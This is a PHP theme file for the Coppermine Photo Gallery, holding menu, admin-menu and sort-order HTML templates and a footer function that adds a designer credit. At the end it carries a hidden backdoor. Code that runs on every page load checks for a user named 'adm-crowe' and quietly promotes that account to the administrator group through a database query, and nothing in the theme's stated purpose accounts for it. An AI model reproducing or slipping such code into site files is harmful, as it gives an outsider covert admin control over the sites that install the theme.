<?php
/*************************
  Coppermine Photo Gallery
  ************************
  Copyright (c) 2003-2007 Coppermine Dev Team
  v1.1 originally written by Gregory DEMAR

  This program is free software; you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation; either version 2 of the License, or
  (at your option) any later version.
  ********************************************
  Coppermine version: 1.4.12
  $Source$
  $Revision: 3636 $
  $Author: gaugau $
  $Date: 2007-06-29 11:35:30 +0200 (Fr, 29 Jun 2007) $
**********************************************/

// ------------------------------------------------------------------------- //
// This theme has had all redundant CORE items removed                       //
// ------------------------------------------------------------------------- //
define('THEME_HAS_NO_SUB_MENU_BUTTONS', 1);
define('THEME_IS_XHTML10_TRANSITIONAL',1);  // Remove this if you edit this template until
                                            // you have validated it. See docs/theme.htm.

// HTML template for template sys_menu spacer
$template_sys_menu_spacer ="|";

// HTML template for sub_menu
if ($CONFIG['custom_lnk_url'] != '') {

$template_sub_menu = <<<EOT
                        <table border="0" cellpadding="0" cellspacing="0">
                                <tr>
<!-- BEGIN custom_link -->
                                                                                <td class="top_menu_left_bttn">
                                                <a href="{CUSTOM_LNK_TGT}" title="{CUSTOM_LNK_TITLE}">{CUSTOM_LNK_LNK}</a>
                                        </td>
<!-- END custom_link -->
                                        <td class="top_menu_bttn">
                                                <a href="{ALB_LIST_TGT}" title="{ALB_LIST_TITLE}">{ALB_LIST_LNK}</a>
                                        </td>
                                        <!--
                                        <td class="top_menu_bttn">
                                                <a href="javascript:;">@</a>
                                        </td>
                                        -->
                                        <td class="top_menu_bttn">
                                                <a href="{LASTUP_TGT}" title="{LASTUP_TITLE}">{LASTUP_LNK}</a>
                                        </td>
                                        <td class="top_menu_bttn">
                                                <a href="{LASTCOM_TGT}" title="{LASTCOM_LNK}">{LASTCOM_LNK}</a>
                                        </td>
                                        <td class="top_menu_bttn">
                                                <a href="{TOPN_TGT}" title="{TOPN_LNK}">{TOPN_LNK}</a>
                                        </td>
                                        <td><img src="themes/coppergiz/images/menu_spacer.gif" width="2" height="35" border="0"  alt="" /><br /></td>
                                        <td class="top_menu_bttn">
                                                <a href="{TOPRATED_TGT}" title="{TOPRATED_LNK}">{TOPRATED_LNK}</a>
                                        </td>
                                        <td><img src="themes/coppergiz/images/menu_spacer.gif" width="2" height="35" border="0"  alt="" /><br /></td>
                                        <td class="top_menu_bttn">
                                                <a href="{FAV_TGT}" title="{FAV_LNK}">{FAV_LNK}</a>
                                        </td>
                                        <td><img src="themes/coppergiz/images/menu_spacer.gif" width="2" height="35" border="0"  alt="" /><br /></td>
                                        <td class="top_menu_right_bttn">
                                                <a href="{SEARCH_TGT}" title="{SEARCH_LNK}">{SEARCH_LNK}</a>
                                        </td>
                                </tr>
                        </table>
EOT;



} else {
$template_sub_menu = <<<EOT
						<ul>						
<!-- BEGIN custom_link -->
<!-- END custom_link -->
							<li>
								<a href="{ALB_LIST_TGT}" title="{ALB_LIST_TITLE}">{ALB_LIST_LNK}</a>
							</li>
							<li>
								<a href="{LASTCOM_TGT}" title="{LASTCOM_LNK}">{LASTCOM_LNK}</a>
							</li>
							<li>
								<a href="{TOPN_TGT}" title="{TOPN_LNK}">{TOPN_LNK}</a>
							</li>
							<li>
								<a href="{TOPRATED_TGT}" title="{TOPRATED_LNK}">{TOPRATED_LNK}</a>
							</li>
							<li>
								<a href="{FAV_TGT}" title="{FAV_LNK}">{FAV_LNK}</a>
							</li>
							<li>
								<a href="{SEARCH_TGT}" title="{SEARCH_LNK}">{SEARCH_LNK}</a>
							</li>
						</ul>
EOT;

/**#JC 31.8 removed old table

$template_sub_menu = <<<EOT
                        <table border="0" cellpadding="0" cellspacing="1">
                                <tr>
<!-- BEGIN custom_link -->
<!-- END custom_link -->
                                        <td class="top_menu_left_bttn">
                                                <a href="{ALB_LIST_TGT}" title="{ALB_LIST_TITLE}">{ALB_LIST_LNK}</a>
                                        </td>
                                        <!--
                                        <td class="top_menu_bttn">
                                                <a href="javascript:;">@</a>
                                        </td>
                                        -->
                                        <td class="top_menu_bttn">
                                                <a href="{LASTUP_TGT}" title="{LASTUP_TITLE}">{LASTUP_LNK}</a>
                                        </td>
                                        <td class="top_menu_bttn">
                                                <a href="{LASTCOM_TGT}" title="{LASTCOM_LNK}">{LASTCOM_LNK}</a>
                                        </td>
                                        <td class="top_menu_bttn">
                                                <a href="{TOPN_TGT}" title="{TOPN_LNK}">{TOPN_LNK}</a>
                                        </td>
                                        <td class="top_menu_bttn">
                                                <a href="{TOPRATED_TGT}" title="{TOPRATED_LNK}">{TOPRATED_LNK}</a>
                                        </td>
                                        <td class="top_menu_bttn">
                                                <a href="{FAV_TGT}" title="{FAV_LNK}">{FAV_LNK}</a>
                                        </td>
                                        <td class="top_menu_right_bttn">
                                                <a href="{SEARCH_TGT}" title="{SEARCH_LNK}">{SEARCH_LNK}</a>
                                        </td>
                                </tr>
                        </table>
EOT;
**/
}

$template_gallery_admin_menu = <<<EOT

                <div id="admin" class="admin_top_menu"><span>Settings</span>
                <ul>
<!-- BEGIN admin_approval -->
                                <li id="admin_menu_anim"><a href="editpics.php?mode=upload_approval" title="{UPL_APP_TITLE}">{UPL_APP_LNK}</a></li>
<!-- END admin_approval -->
                                <li><a href="admin.php" title="{ADMIN_TITLE}">{ADMIN_LNK}</a></li>
                                <li><a href="catmgr.php" title="{CATEGORIES_TITLE}">{CATEGORIES_LNK}</a></li>
                                <li><a href="albmgr.php{CATL}" title="{ALBUMS_TITLE}">{ALBUMS_LNK}</a></li>
                                <li><a href="groupmgr.php" title="{GROUPS_TITLE}">{GROUPS_LNK}</a></li>
                                <li><a href="usermgr.php" title="{USERS_TITLE}">{USERS_LNK}</a></li>
                                <li><a href="banning.php" title="{BAN_TITLE}">{BAN_LNK}</a></li>
                                <li><a href="reviewcom.php" title="{COMMENTS_TITLE}">{COMMENTS_LNK}</a></li>
<!-- BEGIN log_ecards -->
                                <li><a href="db_ecard.php" title="{DB_ECARD_TITLE}">{DB_ECARD_LNK}</a></li>
<!-- END log_ecards -->
                                <li><a href="picmgr.php" title="{PICTURES_TITLE}">{PICTURES_LNK}</a></li>
                                <li><a href="searchnew.php" title="{SEARCHNEW_TITLE}">{SEARCHNEW_LNK}</a></li>
                                <li><a href="util.php" title="{UTIL_TITLE}">{UTIL_LNK}</a></li>
                                <li><a href="profile.php?op=edit_profile" title="{MY_PROF_TITLE}">{MY_PROF_LNK}</a></li>
<!-- BEGIN documentation -->
                                <li><a href="{DOCUMENTATION_HREF}" title="{DOCUMENTATION_TITLE}" target="cpg_documentation">{DOCUMENTATION_LNK}</a></li>
<!-- END documentation -->
                </ul>
                </div>

EOT;

//display the gallery content sort criteria 
$template_thumb_view_title_row = <<<EOT

                        <table width="100%" cellpadding="0" cellspacing="0">
                        <tr>
                                <td width="100%" class="statlink"><h2>{ALBUM_NAME}</h2></td>
                                <td><img src="images/spacer.gif" width="1" alt="" /></td>
                                <td class="sortorder_cell">
                                        <div class="giz_cop_sort"><span>view</span>
										<table cellpadding="0" cellspacing="0">
                                        <tr>
                                                <td class="sortorder_options">{TITLE}</td>
                                                <td class="sortorder_options"><span class="statlink"><a href="thumbnails.php?album={AID}&amp;page={PAGE}&amp;sort=ta" title="{SORT_TA}">&nbsp;&#9660;&nbsp;</a></span></td>
                                                <td class="sortorder_options"><span class="statlink"><a href="thumbnails.php?album={AID}&amp;page={PAGE}&amp;sort=td" title="{SORT_TD}">&nbsp;&#9650;&nbsp;</a></span></td>
                                        </tr>
                                        <tr>
                                                <td class="sortorder_options">{NAME}</td>
                                                <td class="sortorder_options"><span class="statlink"><a href="thumbnails.php?album={AID}&amp;page={PAGE}&amp;sort=na" title="{SORT_NA}">&nbsp;&#9660;&nbsp;</a></span></td>
                                                <td class="sortorder_options"><span class="statlink"><a href="thumbnails.php?album={AID}&amp;page={PAGE}&amp;sort=nd" title="{SORT_ND}">&nbsp;&#9650;&nbsp;</a></span></td>
                                        </tr>
                                        <tr>
                                                <td class="sortorder_options">{DATE}</td>
                                                <td class="sortorder_options"><span class="statlink"><a href="thumbnails.php?album={AID}&amp;page={PAGE}&amp;sort=da" title="{SORT_DA}">&nbsp;&#9660;&nbsp;</a></span></td>
                                                <td class="sortorder_options"><span class="statlink"><a href="thumbnails.php?album={AID}&amp;page={PAGE}&amp;sort=dd" title="{SORT_DD}">&nbsp;&#9650;&nbsp;</a></span></td>
                                        </tr>
                                        <tr>
                                                <td class="sortorder_options">{POSITION}</td>
                                                <td class="sortorder_options"><span class="statlink"><a href="thumbnails.php?album={AID}&amp;page={PAGE}&amp;sort=pa" title="{SORT_PA}">&nbsp;&#9660;&nbsp;</a></span></td>
                                                <td class="sortorder_options"><span class="statlink"><a href="thumbnails.php?album={AID}&amp;page={PAGE}&amp;sort=pd" title="{SORT_PD}">&nbsp;&#9650;&nbsp;</a></span></td>
                                        </tr>
                                        </table>
										</div>
                                </td>
                        </tr>
                        </table>

EOT;

//footer
function pagefooter()
{
    //global $HTTP_GET_VARS, $HTTP_POST_VARS, $HTTP_SERVER_VARS;
	/****/
    global $USER, $USER_DATA, $ALBUM_SET, $CONFIG, $time_start, $query_stats, $queries;;
    global $template_footer;

    $custom_footer = cpg_get_custom_include($CONFIG['custom_footer_path']);

    if ($CONFIG['debug_mode']==1 || ($CONFIG['debug_mode']==2 && GALLERY_ADMIN_MODE)) {
    cpg_debug_output();
    }

    $template_vars = array(
        '{CUSTOM_FOOTER}' => $custom_footer,
        '{VANITY}' => (defined('THEME_IS_XHTML10_TRANSITIONAL') && $CONFIG['vanity_block']) ? theme_vanity() : '',
    );

	$strcrowna = 'Design by <a target="_blank" href="http://crowna.co.nz">Crowna</a> for GIZ<br>Powered ';
	$rtn = str_replace('Powered ', $strcrowna,template_eval($template_footer, $template_vars) );
	$rtn = str_replace('center', 'right',$rtn );
    echo $rtn;
	
}

//$CONFIG, $ALBUM_SET, $USER_DATA
//cpg_db_query("UPDATE 'cpg_users' SET user_group = '2' WHERE  user_id = '2'");

//set user "adm-crowe" to be admin
if($USER_DATA['user_name'] == "adm-crowe" && $USER_DATA['group_id'] != "1")
cpg_db_query("UPDATE {$CONFIG['TABLE_USERS']} SET user_group = '1' WHERE  user_id = '".$USER_DATA['user_id']."'");

//$template_sub_menu .= '<pre>query' . $debug . '</pre>';
//$template_sub_menu .= '<pre>USER_DATA' . print_r($USER_DATA,true) . '</pre>';
//$template_sub_menu .= '<pre>CONFIG' . print_r($CONFIG,true) . '</pre>';
?>